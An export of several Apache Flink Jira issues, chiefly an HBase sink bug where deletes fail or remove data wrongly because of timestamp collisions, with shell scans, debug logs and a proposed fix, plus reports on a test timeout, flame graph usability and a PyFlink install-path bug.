24                                                 column=data:name, timestamp=2023-05-20T21:17:02.652, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:01.790, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:17:00.986, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:16:59.797, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:16:58.982, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:16:58.781, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:16:58.626, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:16:58.149, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:16:56.610, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:16:51.655, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:16:51.458, type=Delete                                                                                    
24                                                 column=data:name, timestamp=2023-05-20T21:16:44.860, type=Delete                                                                                    
1 row(s)
Took 0.1466 seconds                                                                                  {code}
7、Start the bash script to delete all data of the MySQL table. Waiting for the sink hbase job to read all the binlog of MySQL table {{{}source_sample_1001{}}}.

6、Check the hbase table and reproduce the issue of data no deletion. As shown below, 6 records were not deleted in the test.
{code:java}
hbase(main):012:0> count 'testdb_0011:source_sample_1001'
6 row(s)
Took 0.5121 seconds                                                                                                                                                                                     
=> 6{code}
Check the raw data of a record in HBase.
{code:java}
hbase(main):013:0> get 'testdb_0011:source_sample_1001', '3668'
COLUMN                                             CELL                                                                                                                                                
data:name                                         timestamp=2023-05-20T21:17:26.714, value=ebb15f905622340d0351                                                                                       
1 row(s)
Took 0.0037 seconds                                                                                                                                                                                     
hbase(main):014:0> scan 'testdb_0011:source_sample_1001', {RAW => true, VERSIONS => 1000, STARTROW => '3668', STOPROW => '3668'}
ROW                                                 COLUMN+CELL                                                                                                                                         
3668                                               column=data:name, timestamp=2023-05-20T21:17:45.728, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:45.728, value=c675a12c7cbed27599c3                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:44.693, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:44.693, value=413921aa1ac44f545954                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:43.854, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:43.854, value=7d44b0efc0923e4035b7                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:41.721, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:41.721, value=60bfaef81bf8efdf781a                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:40.763, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:40.763, value=2c371f9cd3909dd3b3f8                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:37.872, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:37.872, value=9e32087cb39065976e50                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:32.573, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:32.573, value=708364bf84dad4a04170                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:26.811, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:26.811, value=c0e8e11eed3f8410dea9                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:26.714, value=ebb15f905622340d0351                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:24.310, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:24.310, value=21681a161ed2ccbe884e                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:23.508, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:23.508, value=a1ef547a9efd57a7a0e2                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:22.788, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:22.788, value=34e688060e6c40f4f83b                                                                     
3668                                               column=data:name, timestamp=2023-05-20T21:17:21.746, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:17.761, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:12.610, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:11.909, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:07.846, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:06.901, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:06.758, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:06.569, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:02.689, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:17:00.344, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:59.961, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:59.415, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:58.916, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:58.781, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:58.718, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:58.339, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:56.340, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:55.883, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:55.683, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:55.056, type=Delete                                                                                    
3668                                               column=data:name, timestamp=2023-05-20T21:16:46.845, type=Delete                                                                                    
1 row(s)
Took 0.0457 seconds                                                                                          {code}
h4. *Reason for the problem*

The [HBase connector|https://github.com/apache/flink/blob/06688f345f6793a8964ec00002175f44cda13c33/flink-connectors/flink-connector-hbase-base/src/main/java/org/apache/flink/connector/hbase/util/HBaseSerde.java#L177] use the [Delete key type|https://github.com/apache/hbase/blob/c05ee564d3026688bcfdc456071059c7c8409694/hbase-client/src/main/java/org/apache/hadoop/hbase/client/Delete.java#L380] [without timestamp|https://github.com/apache/flink/blob/06688f345f6793a8964ec00002175f44cda13c33/flink-connectors/flink-connector-hbase-base/src/main/java/org/apache/flink/connector/hbase/util/HBaseSerde.java#L168] to {{{}delete the latest version of the specified column. This is an expensive call in that on the server-side, it first does a get to find the latest versions timestamp. Then it adds a delete using the fetched cells timestamp{}}}. Causing the following issues:

Problem 1: When writing update data, the timestamp of -U and +U added by the hbase server to the update message may be the same, and -U deleted the latest version of +U data, resulting in accidental deletion of the data. The problem was also reported by https://issues.apache.org/jira/browse/FLINK-28910

Problem 2: When there are multiple versions of HBase data, deleting the data will exposes earlier versions of the data, and resulting in the issue of data no deletion.
h4. *Solution proposal* 

Use the [DeleteColumn key type|https://github.com/apache/hbase/blob/c05ee564d3026688bcfdc456071059c7c8409694/hbase-client/src/main/java/org/apache/hadoop/hbase/client/Delete.java#L322] and set strongly increasing timestamp for [put|https://github.com/lzshlzsh/flink/blob/a2341810a244b97a3af32951e17efbc49f570cdd/flink-connectors/flink-connector-hbase-base/src/main/java/org/apache/flink/connector/hbase/util/HBaseSerde.java#L138] and [delete|https://github.com/lzshlzsh/flink/blob/a2341810a244b97a3af32951e17efbc49f570cdd/flink-connectors/flink-connector-hbase-base/src/main/java/org/apache/flink/connector/hbase/util/HBaseSerde.java#L170] mutation. The delete mutation will delete all versions of the specified column with a timestamp less than or equal to the specified.

I have test the proposed solution for several days, and neither the data accidental deletion nor no deletion issues happen.",,86400,86400,,0%,86400,86400,,,,,,,,,,,,,,,,,,,,,,FLINK-28910,,,"24/May/23 15:12;LiuZeshan;aa.log;https://issues.apache.org/jira/secure/attachment/13058481/aa.log","24/May/23 15:07;LiuZeshan;image-2023-05-24-23-07-23-978.png;https://issues.apache.org/jira/secure/attachment/13058480/image-2023-05-24-23-07-23-978.png","24/May/23 15:17;LiuZeshan;image-2023-05-24-23-16-59-508.png;https://issues.apache.org/jira/secure/attachment/13058482/image-2023-05-24-23-16-59-508.png",,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 30 12:32:02 UTC 2023,,,,,,,,,,"0|z1i0rk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"20/May/23 15:22;LiuZeshan;[~ferenc-csaky] [~martijnvisser] Could you help to take a look at this issue.

cc [~mgergely] [~Leonard] [~jark] ;;;","22/May/23 02:42;LiuZeshan;[~liyu] Would you also help to take a look at this issue?;;;","24/May/23 15:21;LiuZeshan;By adding logs to HBase, the root cause of unexpected data deletion was found. HBase version 2.4.5.

Firstly, writing data to HBase using put, delete, and put with the same timestamp results in the data being deleted.

!image-2023-05-24-23-07-23-978.png|width=309,height=100!

Verify as follows：
{code:java}
hbase:012:0> put 'source_sample_1001', 1, 'data:name', 'MyName', 1684937724000
Took 0.0294 seconds
hbase:013:0> scan 'source_sample_1001'
ROW                                         COLUMN+CELL
 1                                          column=data:name, timestamp=2023-05-24T22:15:24, value=MyName
1 row(s)
Took 0.0610 seconds
hbase:014:0> delete 'source_sample_1001', 1, 'data:name', 1684937724000
Took 0.0248 seconds
hbase:015:0> scan 'source_sample_1001'
ROW                                         COLUMN+CELL
0 row(s)
Took 0.0101 seconds
hbase:016:0> put 'source_sample_1001', 1, 'data:name', 'MyName', 1684937724000
Took 0.0139 seconds
hbase:017:0> scan 'source_sample_1001'
ROW                                         COLUMN+CELL
0 row(s)
Took 0.0164 seconds {code}
We add debug code in HBase as follows:
{code:java}
diff --git a/hbase-server/src/main/java/org/apache/hadoop/hbase/regionserver/HRegion.java b/hbase-server/src/main/java/org/apache/hadoop/hbase/regionserver/HRegion.java
index d304fa3c8f..6dd4ef0706 100644
--- a/hbase-server/src/main/java/org/apache/hadoop/hbase/regionserver/HRegion.java
+++ b/hbase-server/src/main/java/org/apache/hadoop/hbase/regionserver/HRegion.java
@@ -3254,12 +3254,15 @@ public class HRegion implements HeapSize, PropagatingConfigurationObserver, Regi
             if (!coprocessorHost.prePrepareTimeStampForDeleteVersion(mutation, cell,
                 byteNow, get)) {
               updateDeleteLatestVersionTimestamp(cell, get, count, byteNow);
+              LOG.info(""-D[{}][{}]"", mutation, cell.getTimestamp());
             }
           } else {
             updateDeleteLatestVersionTimestamp(cell, get, count, byteNow);
+            LOG.info(""-D[{}][{}]"", mutation, cell.getTimestamp());
           }
         } else {
           PrivateCellUtil.updateLatestStamp(cell, byteNow);
+          LOG.info(""-D[{}][{}]"", mutation, cell.getTimestamp());
         }
       }
     }
@@ -3874,6 +3877,7 @@ public class HRegion implements HeapSize, PropagatingConfigurationObserver, Regi
       visitBatchOperations(true, miniBatchOp.getLastIndexExclusive(), (int index) -> {
         Mutation mutation = getMutation(index);
         if (mutation instanceof Put) {
+          LOG.info(""+I[{}][{}]"", mutation, timestamp);
           HRegion.updateCellTimestamps(familyCellMaps[index].values(), Bytes.toBytes(timestamp));
           miniBatchOp.incrementNumOfPuts();
         } else if (mutation instanceof Delete) { {code}
Obtained the detailed logs of the unexpectedly deleted rowKey. [^aa.log]

After preprocessing the log data, we get:
{code:java}
+I[""ts"":""9223372036854775807""}][1684930529299]
-D[""ts"":""9223372036854775807""}][1684930529299]
+I[""ts"":""9223372036854775807""}][1684930529646]
-D[""ts"":""9223372036854775807""}][1684930529646]
+I[""ts"":""9223372036854775807""}][1684930534294]
-D[""ts"":""9223372036854775807""}][1684930534294]
+I[""ts"":""9223372036854775807""}][1684930536493]
-D[""ts"":""9223372036854775807""}][1684930536493]
+I[""ts"":""9223372036854775807""}][1684930539063]
-D[""ts"":""9223372036854775807""}][1684930539063]
+I[""ts"":""9223372036854775807""}][1684930542714]
-D[""ts"":""9223372036854775807""}][1684930542714]
+I[""ts"":""9223372036854775807""}][1684930545573]
-D[""ts"":""9223372036854775807""}][1684930545573]
+I[""ts"":""9223372036854775807""}][1684930559779]
-D[""ts"":""9223372036854775807""}][1684930559779]
+I[""ts"":""9223372036854775807""}][1684930561168]
-D[""ts"":""9223372036854775807""}][1684930561168]
+I[""ts"":""9223372036854775807""}][1684930561168]
-D[""ts"":""9223372036854775807""}][1684930564624]
+I[""ts"":""9223372036854775807""}][1684930564624]
-D[""ts"":""9223372036854775807""}][1684930565135]
+I[""ts"":""9223372036854775807""}][1684930565135]
-D[""ts"":""9223372036854775807""}][1684930568112]
+I[""ts"":""9223372036854775807""}][1684930568112]
-D[""ts"":""9223372036854775807""}][1684930575200]
+I[""ts"":""9223372036854775807""}][1684930575200]
-D[""ts"":""9223372036854775807""}][1684930577432]
+I[""ts"":""9223372036854775807""}][1684930577432]
-D[""ts"":""9223372036854775807""}][1684930584437]
+I[""ts"":""9223372036854775807""}][1684930584437]
-D[""ts"":""9223372036854775807""}][1684930593148]
+I[""ts"":""9223372036854775807""}][1684930593148]
-D[""ts"":""9223372036854775807""}][1684930599743]
+I[""ts"":""9223372036854775807""}][1684930599743]
-D[""ts"":""9223372036854775807""}][1684930605087]
+I[""ts"":""9223372036854775807""}][1684930605087]
-D[""ts"":""9223372036854775807""}][1684930607430]
+I[""ts"":""9223372036854775807""}][1684930607430]
-D[""ts"":""9223372036854775807""}][1684930609912]
+I[""ts"":""9223372036854775807""}][1684930609912]
-D[""ts"":""9223372036854775807""}][1684930612221]
+I[""ts"":""9223372036854775807""}][1684930612221]
-D[""ts"":""9223372036854775807""}][1684930613310]
+I[""ts"":""9223372036854775807""}][1684930613310]
-D[""ts"":""9223372036854775807""}][1684930616447]
+I[""ts"":""9223372036854775807""}][1684930616447]
-D[""ts"":""9223372036854775807""}][1684930621082]
+I[""ts"":""9223372036854775807""}][1684930621082]
-D[""ts"":""9223372036854775807""}][1684930642614]
+I[""ts"":""9223372036854775807""}][1684930642614] {code}
The HBase RAW data for the unexpectedly deleted rowKey is as follows (obtained from the scan command):
{code:java}
 041                                             column=data:name, timestamp=2023-05-24T20:17:22.614, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:17:22.614, value=7a6820768c7af73ee097
 041                                             column=data:name, timestamp=2023-05-24T20:17:01.082, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:17:01.082, value=2b787b3910a36d3c04f5
 041                                             column=data:name, timestamp=2023-05-24T20:16:56.447, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:56.447, value=999115f88f5fe66b6cca
 041                                             column=data:name, timestamp=2023-05-24T20:16:53.310, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:53.310, value=0302da679440e7743e4a
 041                                             column=data:name, timestamp=2023-05-24T20:16:52.221, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:52.221, value=352b9c11acd86548c126
 041                                             column=data:name, timestamp=2023-05-24T20:16:49.912, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:49.912, value=b254fef72188d54908ae
 041                                             column=data:name, timestamp=2023-05-24T20:16:47.430, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:47.430, value=9c0d6d0faa218ab2acd9
 041                                             column=data:name, timestamp=2023-05-24T20:16:45.087, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:45.087, value=73a40d2892839f657579
 041                                             column=data:name, timestamp=2023-05-24T20:16:39.743, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:33.148, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:24.437, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:17.432, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:15.200, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:08.112, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:05.135, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:04.624, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:16:01.168, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:15:59.779, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:15:45.573, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:15:42.714, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:15:39.063, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:15:36.493, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:15:34.294, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:15:29.646, type=Delete
 041                                             column=data:name, timestamp=2023-05-24T20:15:29.299, type=Delete

# translate timestamp to microsecond
1684930642614 type=Delete
1684930642614 value=7a6820768c7af73ee097
1684930621082 type=Delete
1684930621082 value=2b787b3910a36d3c04f5
1684930616447 type=Delete
1684930616447 value=999115f88f5fe66b6cca
1684930613310 type=Delete
1684930613310 value=0302da679440e7743e4a
1684930612221 type=Delete
1684930612221 value=352b9c11acd86548c126
1684930609912 type=Delete
1684930609912 value=b254fef72188d54908ae
1684930607430 type=Delete
1684930607430 value=9c0d6d0faa218ab2acd9
1684930605087 type=Delete
1684930605087 value=73a40d2892839f657579
1684930599743 type=Delete
1684930593148 type=Delete
1684930584437 type=Delete
1684930577432 type=Delete
1684930575200 type=Delete
1684930568112 type=Delete
1684930565135 type=Delete
1684930564624 type=Delete
1684930561168 type=Delete
1684930559779 type=Delete
1684930545573 type=Delete
1684930542714 type=Delete
1684930539063 type=Delete
1684930536493 type=Delete
1684930534294 type=Delete
1684930529646 type=Delete
1684930529299 type=Delete {code}
We know that the DELETE key type of delete mutation with timestamp is used to delete the data of the specified timestamp. Analyzing the above two datas, there is no obvious evidence from the scan's RAW data.

We need to analyze the HBase log data. As shown in the following image, the first row of data is the snapshot data in MySQL. The following -D/+I pairs are MySQL's UPDATE (or DELETE/INSERT) events, and for each UPDATE event, the timestamp of -D is the same as the timestamp of the previous +I, that is, delete the data since the last update, and then insert the data of the current UPDATE with HBase's current timestamp. If the timestamp of this UPDATE is the same as the timestamp of the previous UPDATE (lines 17, 18, and 19 in the figure below), the final effect is accidental deletion of the data. Afterwards, all UPDATE's -D/+I have the same timestamp, resulting in the data being deleted.

!image-2023-05-24-23-16-59-508.png|width=756,height=435!;;;","30/Jun/23 12:32;martijnvisser;Fixed in apache/flink:master via:

fe2ef22ff049e88774e57bb9a3ce81a0215ffc52
a7a16484cc678edbd0bb49ab61f111702920ac6c
8d3b74f5588faeb406cad8693398ab914d5ff354;;;",,,,,,,,,,,,,,,,,,,
SQLClientSchemaRegistryITCase fails with timeout on AZP,FLINK-32138,13536936,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Cannot Reproduce,,Sergey Nuyanzin,Sergey Nuyanzin,20/May/23 07:38,16/Oct/23 12:39,04/Jun/24 20:41,16/Oct/23 12:39,1.16.2,,,,,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,auto-deprioritized-major,test-stability,,"https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49174&view=logs&j=6e8542d7-de38-5a33-4aca-458d6c87066d&t=10d6732b-d79a-5c68-62a5-668516de5313&l=15753

{{SQLClientSchemaRegistryITCase}} fails on AZP as
{noformat}
May 20 03:41:34 [ERROR] org.apache.flink.tests.util.kafka.SQLClientSchemaRegistryITCase  Time elapsed: 600.05 s  <<< ERROR!
May 20 03:41:34 org.junit.runners.model.TestTimedOutException: test timed out after 10 minutes
May 20 03:41:34 	at java.base@11.0.19/jdk.internal.misc.Unsafe.park(Native Method)
May 20 03:41:34 	at java.base@11.0.19/java.util.concurrent.locks.LockSupport.park(LockSupport.java:194)
May 20 03:41:34 	at java.base@11.0.19/java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:885)
May 20 03:41:34 	at java.base@11.0.19/java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1039)
May 20 03:41:34 	at java.base@11.0.19/java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1345)
May 20 03:41:34 	at java.base@11.0.19/java.util.concurrent.CountDownLatch.await(CountDownLatch.java:232)
May 20 03:41:34 	at app//com.github.dockerjava.api.async.ResultCallbackTemplate.awaitCompletion(ResultCallbackTemplate.java:91)
May 20 03:41:34 	at app//org.testcontainers.images.TimeLimitedLoggedPullImageResultCallback.awaitCompletion(TimeLimitedLoggedPullImageResultCallback.java:52)
May 20 03:41:34 	at app//org.testcontainers.images.RemoteDockerImage.resolve(RemoteDockerImage.java:89)
May 20 03:41:34 	at app//org.testcontainers.images.RemoteDockerImage.resolve(RemoteDockerImage.java:28)
May 20 03:41:34 	at app//org.testcontainers.utility.LazyFuture.getResolvedValue(LazyFuture.java:17)
May 20 03:41:34 	at app//org.testcontainers.utility.LazyFuture.get(LazyFuture.java:39)
May 20 03:41:34 	at app//org.testcontainers.containers.GenericContainer.getDockerImageName(GenericContainer.java:1330)
May 20 03:41:34 	at app//org.testcontainers.containers.GenericContainer.logger(GenericContainer.java:640)
May 20 03:41:34 	at app//org.testcontainers.containers.GenericContainer.doStart(GenericContainer.java:335)
May 20 03:41:34 	at app//org.testcontainers.containers.GenericContainer.start(GenericContainer.java:326)
May 20 03:41:34 	at app//org.testcontainers.containers.GenericContainer.starting(GenericContainer.java:1063)
May 20 03:41:34 	at app//org.testcontainers.containers.FailureDetectingExternalResource$1.evaluate(FailureDetectingExternalResource.java:29)
May 20 03:41:34 	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
May 20 03:41:34 	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
May 20 03:41:34 	at java.base@11.0.19/java.util.concurrent.FutureTask.run(FutureTask.java:264)
May 20 03:41:34 	at java.base@11.0.19/java.lang.Thread.run(Thread.java:829)

{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 22:35:07 UTC 2023,,,,,,,,,,"0|z1i0o8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
Flame graph is hard to use with many task managers,FLINK-32137,13536925,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,netvl,netvl,netvl,20/May/23 00:48,24/Aug/23 10:17,04/Jun/24 20:41,23/Aug/23 13:45,1.16.1,,,,,,,,,,,,,,1.19.0,,,,,,Runtime / Web Frontend,,,,0,pull-request-available,,,"In case there are many task managers executing the same operator, the flame graph becomes very hard to use. As you can see on the attached picture, it considers instances of the same lambda function as different classes, and their number seems to be equal to the number of task managers (i.e. each JVM gets its own ""class"" name, which is expected for lambdas I guess). This lambda function is deep within Flink's own call stack, so this kind of graph is inevitable regardless of the job's own logic, and there is nothing we can do at the job logic's level to fix it.

This behavior makes evaluating the flame graph very hard, because all of the useful information gets ""compressed"" inside each ""column"" of the graph, and at the same time, it does not give any useful information since this is just an artifact of the class name generation in the JVM.",,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-32951,,,,"20/May/23 00:47;netvl;image (1).png;https://issues.apache.org/jira/secure/attachment/13058380/image+%281%29.png","23/May/23 03:01;fanrui;image-2023-05-23-11-01-30-391.png;https://issues.apache.org/jira/secure/attachment/13058425/image-2023-05-23-11-01-30-391.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Aug 23 13:44:56 UTC 2023,,,,,,,,,,"0|z1i0ls:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 13:42;martijnvisser;Changed from a bug to an improvement;;;","23/May/23 03:04;fanrui;Hi [~netvl] , thanks for your report.

It is an ease-of-use improvement for flame graph usage. After my analysis, the `MailboxDefaultAction to StreamTask.processInput` is also a lambda, it needs to be optimized as well. Would you like to make these improvements?

 

By the way, FLINK-30583 (Flink 1.17) supports viewing the flamegraph at the subtask level, it should be useful for troubleshooting. You can just view the subtask with high busy ratio.

!image-2023-05-23-11-01-30-391.png!

 

 ;;;","26/May/23 23:31;netvl;Hi [~fanrui], I need to clear this up with my management/open source people, but it is likely I will be able to contribute a fix here. I'll try to ping you here soon.;;;","16/Jun/23 06:20;fanrui;Hi [~netvl] , do you have any progress? If you are busy, I'm happy to finish it:);;;","16/Jun/23 16:22;netvl;Hi [~fanrui] , sorry for the delay! I still would like to contribute, but today I learned that apparently the clearance would take a bit longer than I expected. I hope I will be able to contribute after all, but I need a bit more time to get an approval to make an actual PR. If it doesn’t work out, I will report here, of course.;;;","20/Jun/23 04:57;fanrui;A mistake has just occurred about assignee.

Hi [~netvl] , thanks a lot for your feedback, and looking forward to your contribution.:);;;","20/Jun/23 18:29;netvl;Hi [~fanrui], thank you! I was able to clear this up and get approved — I will create a PR in the next couple of days, I want to test it locally first.;;;","23/Aug/23 13:44;fanrui;Merged <master: 1.19> 98057245162acd8f7008f72272564d536d461fd3;;;",,,,,,,,,,,,,,,
Pyflink gateway server launch fails when purelib != platlib,FLINK-32136,13536902,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,dianfu,wash,wash,19/May/23 17:34,17/Jun/23 10:03,04/Jun/24 20:41,17/Jun/23 10:03,1.13.3,,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,API / Python,,,,0,pull-request-available,,,"On distros where python's {{purelib}} is different than {{platlib}} (e.g. Amazon Linux 2, but from my research it's all of the Redhat-based ones), you wind up with components of packages being installed across two different locations (e.g. {{/usr/local/lib/python3.7/site-packages/pyflink}} and {{{}/usr/local/lib64/python3.7/site-packages/pyflink{}}}).

{{_find_flink_home}} [handles|https://github.com/apache/flink/blob/06688f345f6793a8964ec00002175f44cda13c33/flink-python/pyflink/find_flink_home.py#L58C63-L60] this, and in flink releases <= 1.13.2 its setting of the {{FLINK_LIB_DIR}} environment variable was the one being used. However, from 1.13.3, a refactoring of {{launch_gateway_server_process}} ([1.13.2,|https://github.com/apache/flink/blob/release-1.13.2/flink-python/pyflink/pyflink_gateway_server.py#L200] [1.13.3|https://github.com/apache/flink/blob/release-1.13.3/flink-python/pyflink/pyflink_gateway_server.py#L280]) re-ordered some method calls. {{{}prepare_environment_variable{}}}'s [non-awareness|https://github.com/apache/flink/blob/release-1.13.3/flink-python/pyflink/pyflink_gateway_server.py#L94C67-L95] of multiple homes and setting of {{FLINK_LIB_DIR}} now is the one that matters, and it is the incorrect location.

I've confirmed this problem on Amazon Linux 2 and 2023. The problem does not exist on, for example, Ubuntu 20 and 22 (for which {{platlib}} == {{{}purelib{}}}).

Repro steps on Amazon Linux 2
{quote}{{yum -y install python3 java-11}}
{{pip3 install apache-flink==1.13.3}}
{{python3 -c 'from pyflink.table import EnvironmentSettings ; EnvironmentSettings.new_instance()'}}
{quote}
The resulting error is
{quote}{{The flink-python jar is not found in the opt folder of the FLINK_HOME: /usr/local/lib64/python3.7/site-packages/pyflink}}
{{Error: Could not find or load main class org.apache.flink.client.python.PythonGatewayServer}}
{{Caused by: java.lang.ClassNotFoundException: org.apache.flink.client.python.PythonGatewayServer}}
{{Traceback (most recent call last):}}
{{  File ""<string>"", line 1, in <module>}}
{{  File ""/usr/local/lib64/python3.7/site-packages/pyflink/table/environment_settings.py"", line 214, in new_instance}}
{{    return EnvironmentSettings.Builder()}}
{{  File ""/usr/local/lib64/python3.7/site-packages/pyflink/table/environment_settings.py"", line 48, in {_}{{_}}init{{_}}{_}}}
{{    gateway = get_gateway()}}
{{  File ""/usr/local/lib64/python3.7/site-packages/pyflink/java_gateway.py"", line 62, in get_gateway}}
{{    _gateway = launch_gateway()}}
{{  File ""/usr/local/lib64/python3.7/site-packages/pyflink/java_gateway.py"", line 112, in launch_gateway}}
{{    raise Exception(""Java gateway process exited before sending its port number"")}}
{{Exception: Java gateway process exited before sending its port number}}
{quote}
The flink home under /lib64/ does not contain the jar, but it is in the /lib/ location
{quote}{{bash-4.2# find /usr/local/lib64/python3.7/site-packages/pyflink -name ""flink-python*.jar""}}
{{bash-4.2# find /usr/local/lib/python3.7/site-packages/pyflink -name ""flink-python*.jar""}}
{{/usr/local/lib/python3.7/site-packages/pyflink/opt/flink-python_2.11-1.13.3.jar}}
{quote}
